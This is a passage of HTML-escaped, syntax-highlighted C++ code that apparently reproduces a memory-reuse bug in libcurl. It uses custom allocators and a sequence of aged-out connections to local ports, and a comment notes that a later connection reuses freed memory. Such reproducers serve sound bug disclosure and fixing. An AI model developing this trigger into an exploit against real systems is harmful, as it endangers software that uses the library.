class=\"n\"\u003ecurl_global_init_mem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCURL_GLOBAL_DEFAULT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003emalloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003efree_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003erealloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003estrdup_\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ecalloc_\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003emulti\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://127.0.0.1:1234/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_CONNECT_ONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_VERBOSE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_MAXAGE_CONN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_add_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Create connection to port 1234\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_socket_action\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURL_SOCKET_TIMEOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003einfo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_info_read\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLMSG_DONE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy_handle\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1234\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Allow connection to port 1234 to age out\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003ethis_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003esleep_for\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mx\"\u003e2s\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://127.0.0.1:1235/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_CONNECT_ONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_VERBOSE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_MAXAGE_CONN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_add_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Create connection to port 1235, then close connection to port 1234 as it is too old\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_socket_action\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURL_SOCKET_TIMEOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003einfo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_info_read\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLMSG_DONE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy_handle\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1235\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://127.0.0.1:1236/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_CONNECT_ONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_VERBOSE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_easy_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLOPT_MAXAGE_CONN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1L\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eeret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLE_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_add_handle\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eeasy1236\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Create connection to port 1236, which re-uses the memory of the previous connection to port 1234\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_socket_action\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emulti\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eCURL_SOCKET_TIMEOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003erunning\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emret\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eCURLM_OK\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eremaining\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003einfo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecurl_multi_info_read\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 